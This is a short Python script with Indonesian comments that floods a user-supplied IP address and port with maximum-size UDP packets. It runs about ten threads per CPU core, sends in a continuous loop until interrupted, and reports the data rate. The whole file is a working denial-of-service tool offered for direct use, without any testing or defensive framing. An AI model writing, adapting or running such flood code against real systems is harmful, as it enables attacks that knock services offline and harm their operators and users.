import socket
import threading
import signal
import os
import time
import sys

# Alamat IP target
target_ip = input("Masukkan alamat IP target: ")

# Port target
target_port = int(input("Masukkan port target: "))

# Jumlah thread
num_threads = os.cpu_count() * 10

# Signal untuk menghentikan thread
stop_signal = False

# Variabel untuk menghitung data yang dikirimkan
data_sent = 0

# Mulai waktu
start_time = time.time()

# Animasi loading
animation = "|/-\\"

# Paket yang lebih besar
packet = b"A" * 65507

def signal_handler(signal, frame):
    global stop_signal
    stop_signal = True

def udp_worker():
    global data_sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while not stop_signal:
            sock.sendto(packet, (target_ip, target_port))
            data_sent += len(packet)
    except Exception as e:
        print(f"UDP Error: {str(e)}")
    finally:
        sock.close()

def main():
    # Daftarkan signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Mulai thread UDP
    for i in range(num_threads):
        t = threading.Thread(target=udp_worker)
        t.start()

    i = 0
    while True:
        if stop_signal:
            break
        sys.stdout.write("\r" + animation[i % len(animation)])
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)

    elapsed_time = time.time() - start_time
    print(f"\nData sent: {data_sent} bytes")
    print(f"Time elapsed: {elapsed_time} seconds")
    print(f"Data rate: {data_sent / elapsed_time / (1024*1024)} MB/s")
    print(f"Data rate: {8 * data_sent / elapsed_time / (1024*1024)} Mbps")

if __name__ == "__main__":
    main()
